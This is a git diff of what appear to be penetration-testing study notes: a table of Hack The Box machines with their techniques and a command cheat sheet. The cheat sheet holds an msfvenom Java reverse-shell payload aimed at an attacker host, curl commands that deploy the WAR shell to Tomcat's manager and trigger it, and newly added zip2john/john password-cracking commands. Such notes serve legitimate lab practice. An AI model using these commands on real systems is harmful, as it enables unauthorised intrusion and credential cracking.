@@ -49,7 +49,7 @@ https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLg
 | SolidState | Apache James 2.3.2, *reset user password, POP3, <br> trigger by ssh login | task, file permission |
 | Sunday | finger enum [users](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt), SSH, backup folder, hashcat 7400 | sudo list (wget) |
 | SwagShop | Magento CVE-2015-1397 | sudo list (vi) |
-| Tabby | LFI, tomcat-users.xml, page source, remote deploy, file password ||
+| Tabby | LFI, tomcat-users.xml, page source, remote deploy, <br> file password ||
 
 (*):review before the exam
 
@@ -196,4 +196,7 @@ msfvenom -p java/shell_reverse_tcp lhost=<attacker ip> lport=<attacker port> -f 
 curl -v -u 'tomcat:<password>' --upload-file shell.war "http://<target ip>:<port>/manager/text/deploy?path=/test&update=true"
 # trigger
 curl http://<target ip>:<port>/test/
+# crack zip file password
+zip2john <file> > hash
+john --wordlist=<password_list> hash       
 ```
